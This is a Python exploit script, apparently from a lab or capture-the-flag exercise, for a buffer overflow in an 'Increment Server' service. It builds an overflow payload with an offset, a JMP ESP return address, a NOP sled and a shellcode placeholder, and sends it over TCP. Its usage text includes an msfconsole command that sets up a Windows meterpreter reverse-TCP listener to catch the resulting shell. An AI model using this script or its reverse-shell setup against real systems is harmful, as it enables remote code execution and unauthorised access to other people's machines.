#!/usr/bin/env python3
import socket
import sys

def exploit(host, port):
    """
    Full exploit for Increment Server buffer overflow
    """
    
    print("[*] Building exploit payload...")
    
    # EIP offset is 20 bytes
    offset = 20
    
    # JMP ESP address: 0x50352249 (little-endian)
    jmp_esp = b"\x49\x22\x35\x50"
    
    # NOP sled
    nop_sled = b"\x90" * 32
    
   
    buf =  b""
    buf += b"PASTE HERE"
    
    
    
    # build the payload
    padding = b"A" * offset
    payload = padding + jmp_esp + nop_sled + buf
    
    print("[*] Payload size: " + str(len(payload)) + " bytes")
    print("[*] Connecting to " + host + ":" + str(port))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        # recv banner
        banner = s.recv(1024)
        print("[*] Banner: " + banner.decode().strip())
        
        # send exploit
        exploit_payload = b"INC " + payload + b"\n"
        print("[*] Sending exploit...")
        s.send(exploit_payload)
        
        print("[+] Exploit sent!")
        print("[*] Check your meterpreter listener for a session")
        
        s.close()
        
    except Exception as e:
        print("[!] Error: " + str(e))
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: " + sys.argv[0] + " <host> <port>")
        print("Example: " + sys.argv[0] + " 192.168.194.171 2223")
        print()
        print("Before running:")
        print("   msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <your_kali_ip>; set LPORT 4444; exploit'")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    exploit(host, port)